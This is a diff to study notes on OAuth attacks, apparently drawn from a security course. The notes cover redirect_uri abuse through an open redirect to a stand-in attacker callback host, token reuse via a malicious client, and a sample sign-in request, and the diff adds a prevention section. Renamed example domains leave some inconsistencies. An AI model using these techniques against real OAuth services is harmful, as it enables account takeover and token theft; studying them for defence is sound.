@@ -3,7 +3,16 @@
 #
 https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts
 #
+https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics
+#
 ##
+
+
+```
+Investigate if the redirect_uri is properly validated
+Investigate if a state parameter is present and properly validated
+Investigate for possible XSS vulnerabilities from reflected OAuth parameters
+```
 
 OAuth Entities
 The OAuth protocol comprises the following acting entities:
@@ -151,23 +160,25 @@ As we discussed a couple sections ago, the redirect_uri parameter may be exploit
 
 This may seem perfectly secure, and on its own, it is. However, this drastically changes when the client web application hosed on the whitelisted origin contains an open redirect. While some open redirects can be security vulnerabilities, other open redirects exist by design, for instance, redirect endpoints in social media. However, an open redirect can be exploited by an attacker to steal a victim's OAuth token.
 
-To explore this in more detail, let us assume, the OAuth client academy.htb hosts its callback endpoint at http://academy.htb/callback and implements an open redirect at http://academy.htb/redirect that redirects to any URL provided in the GET parameter url. Furthermore, the authorization server hubgit.htb validates the redirect_uri provided in an authorization request by checking it against the whitelisted origin http://academy.htb/.
+To explore this in more detail, let us assume, the OAuth client academy.edu hosts its callback endpoint at http://academy.edu/callback and implements an open redirect at http://academy.edu/redirect that redirects to any URL provided in the GET parameter url. Furthermore, the authorization server hubgit.edu validates the redirect_uri provided in an authorization request by checking it against the whitelisted origin http://academy.edu/.
 
 Now, an attacker can exploit this scenario to steal a victim's authorization code by sending a manipulated authorization request to the victim with the following redirect URL:
 
-http://academy.htb/redirect?u=http://attacker.htb/callback
-This URL passes the authorization server's validation. However, after successful authentication by the user, the authorization code is first sent to http://academy.htb/redirect, resulting in a redirect to http://attacker.htb/callback. Thus, the attacker obtains the authorization code despite the correctly implemented validation of the redirect_uri parameter. The rest of the exploit works just as described in the section Stealing Access Tokens.
+http://things.edu/redirect?u=http://attacker.edu/callback
+This URL passes the authorization server's validation. However, after successful authentication by the user, the authorization code is first sent to http://things.edu/redirect, resulting in a redirect to http://attacker.edu/callback. Thus, the attacker obtains the authorization code despite the correctly implemented validation of the redirect_uri parameter. The rest of the exploit works just as described in the section Stealing Access Tokens.
 
 This scenario resulted in a real world bug bounty report disclosed here.
 
 Abusing a Malicious Client
 So far, we have assumed the attacker to be a separate actor not present in the OAuth flow. However, typically, authorization servers support OAuth client registration, enabling an attacker to create their own malicious OAuth client under their control. The attacker can then use this client to obtain access tokens from unknowing victims, which may be used in improperly implemented OAuth clients for victim impersonation.
 
-For instance, an attacker could create the web application evil.htb and register it as an OAuth client with hubgit.htb to enable OAuth authentication. If an unknowing victim logs in to evil.htb with their hubgit.htb account using OAuth, the attacker controlled client receives the user's access token to hubgit.htb. The attacker could now try to use this access token to access academy.htb. If the client academy.htb does not verify that the access token was issued for a different client and grants access, the attacker is able to impersonate the victim on academy.htb.
+For instance, an attacker could create the web application evil.edu and register it as an OAuth client with hubgit.edu to enable OAuth authentication. If an unknowing victim logs in to evil.edu with their hubgit.edu account using OAuth, the attacker controlled client receives the user's access token to hubgit.edu. The attacker could now try to use this access token to access academy.edu. If the client academy.edu does not verify that the access token was issued for a different client and grants access, the attacker is able to impersonate the victim on academy.edu.
 
 A scenario similar to this was discovered in the real world as described here
-https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts
 
+##
+https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts
+##
 
 
 
@@ -179,9 +190,23 @@ In the authorization request, the attacker can choose an arbitrary value for the
 
 ```
 POST /authorization/signin HTTP/1.1
-Host: hubgit.htb
+Host: hubgit.things
 Content-Length: 96
 Content-Type: application/x-www-form-urlencoded
 
 username=attacker&password=attacker&client_id=0e8f12335b0bf225&redirect_uri=%2Fclient%2Fcallback&state=1337
 ```
+
+
+
+OAuth Vulnerability Prevention
+As we have seen, there are multiple ways that improper implementation of the OAuth flow can result in web vulnerabilities. Some of these vulnerabilities result in devastating consequences, including leakage of the entire user session. To prevent these vulnerabilities, all OAuth entities must implement strict security measures. In particular, the authorization server and the client must strictly implement and adhere to all aspects of the OAuth protocol.
+
+OAuth Vulnerability Prevention
+Generally, the OAuth standard must be strictly followed to prevent vulnerabilities resulting from faulty implementation. This applies to all OAuth entities. Furthermore, to prevent CSRF vulnerabilities, the state parameter must be enforced by the authorization server and implemented by the client, even though the standard does not strictly require it.
+
+Additionally, the client must prefer the authorization code grant over the implicit grant if possible. Thoroughly validating all OAuth flow requests and responses is essential for preventing common vulnerabilities such as open redirect attacks and token leakage. OAuth authorization servers should carefully validate redirect URIs to ensure they belong to trusted domains and reject requests with suspicious or unauthorized redirect URLs. OAuth clients must securely store access tokens and ensure they are transmitted over secure channels using HTTPS to prevent interception and token theft.
+
+On top of that, general security measures apply to systems responsible for OAuth implementation. That includes regular security audits, penetration testing, and code reviews. These can help identify and mitigate vulnerabilities in OAuth implementations while staying informed about the latest security threats and best practices. Another critical aspect of vulnerability prevention involves implementing robust authentication mechanisms, such as multi-factor authentication (MFA), to add an extra layer of security to the OAuth process. By requiring users to verify their identity through multiple factors such as passwords, biometrics, or one-time codes, MFA significantly reduces the risk of unauthorized access, even if credentials are compromised.
+
+For more details on OAuth securiy best practices, check out this document.
